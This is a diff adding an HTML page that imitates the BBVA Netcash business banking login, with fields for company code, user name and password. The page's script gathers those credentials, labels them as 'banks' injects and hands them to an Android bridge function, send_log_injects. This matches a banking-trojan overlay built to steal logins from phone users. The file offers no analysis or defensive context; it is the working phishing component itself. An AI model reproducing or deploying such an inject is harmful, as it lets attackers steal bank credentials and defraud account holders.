@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>bbva</title>
+    <link rel="shortcut icon" href="com.bbva.netcash.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #004481;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+        height: 755px;
+    }
+    .logo {
+text-align: center;
+    background-size: 100%;
+    padding: 0px 0px 10px 0px;
+    background: none;
+    color: #fff;
+    font-weight: 400;
+    text-decoration: none;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 10px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 10px 0px;
+    color: #3089d9;
+    text-align: left;
+    outline: none;
+    border: 1px solid #0477df;
+    background: none;
+    border-top: none;
+    border-left: none;
+    border-right: none;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #ffffff;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #237ABA;
+}
+input::placeholder {
+    color: #3089d9;
+    font-size: 15px;
+}
+input[type="checkbox"] {
+    display: none;
+}
+
+/* стили для метки */
+input[type="checkbox"] + label {
+    cursor: pointer;
+    padding-left: 50px;
+    position: relative;
+    font-family: tahoma, sans-serif, arial;
+    line-height: 40px;
+}
+
+/* стили для поля с бегунком*/
+input[type="checkbox"] + label::before {
+content: "";
+    display: inline-block;
+    position: absolute;
+    top: 0;
+    left: 0;
+    vertical-align: middle;
+    padding: 0;
+    height: 24px;
+    width: 45px;
+    margin: 0 5px 0 0;
+    border: 1px solid #cacaca;
+    border-radius: 12px;
+    background: none;
+}
+
+/* стили для бегунка*/
+input[type="checkbox"] + label::after {
+    content: "";
+    display: block;
+    position: absolute;
+    top: 1px;
+    left: 1px;
+    width: 22px;
+    height: 22px;
+    border-radius: 22px;
+    background: #ffffff;
+    border: 1px solid #cacaca;
+    box-shadow: 0 3px 3px rgba(140, 140, 140, .1);
+}
+
+/* плавность )) */
+input[type="checkbox"] + label::before,
+input[type="checkbox"] + label::after {
+    -webkit-transition: all .2s ease-out;
+    transition: all .2s ease-out;
+}
+
+
+input[type="checkbox"]:checked + label::after {
+    left: 22px;
+}
+</style>
+
+
+<fieldset id="formtosend">
+
+<div class="" id="log" style="display: block;">
+
+<div class="logo">
+<img src="data:image/png;base64,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" style="width: 100px; margin-top: 30px;">
+</div>
+
+<div class="area" style="padding: 30px;border-radius: 10px;margin: 0px 20px 0px 20px;height: 180px;">
+        <input type="text" name="codigo" id="codigo" placeholder="Código de empresa" style="height: 50px;">
+        <input type="text" name="usuario" id="usuario" placeholder="Usuario" style="height: 50px;">
+        <input type="password" name="password" id="password" placeholder="Contraseña" style="height: 50px;">
+        <div style="position: relative;top: 10px;">
+                <label style="color: #71b8f8;font-size: 15px;float: left;">Recordar código de empresa y usuario</label>
+        <input id="checkbox1" name="sumbit" type="checkbox">
+        <label for="checkbox1" style="float: right;"></label>
+    </div>
+        <input type="button" name="sumbit" onclick="send_form()" value="Entrar" style="">
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        returnResult : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form(){
+    if(document.getElementById('codigo').value.length>=4 && document.getElementById('usuario').value.length>=4 && document.getElementById('password').value.length>=4) {
+        var data = {};
+
+
+
+        data.codigo = document.getElementById('codigo').value;
+        data.usuario = document.getElementById('usuario').value;
+        data.password = document.getElementById('password').value;
+        data.type_injects = "banks";
+        data.closed = "close_activity_injects";
+
+
+
+
+        var ua = navigator.userAgent.toLowerCase();
+        if(ua.indexOf("android") > -1) {
+            try {
+                Android.send_log_injects(JSON.stringify(data))
+            } catch (err) {}
+            }else{
+                alert(JSON.stringify(data));
+            }
+       }
+}
+
+
+function show() {
+    var p = document.getElementById('password');
+    p.setAttribute('type', 'text');
+}
+
+function hide() {
+    var p = document.getElementById('password');
+    p.setAttribute('type', 'password');
+}
+
+var pwShown = 0;
+
+document.getElementById("eye").addEventListener("click", function () {
+    if (pwShown == 0) {
+        pwShown = 1;
+        show();
+    } else {
+        pwShown = 0;
+        hide();
+    }
+}, false);
+</script>
+
+</body>
+</html>
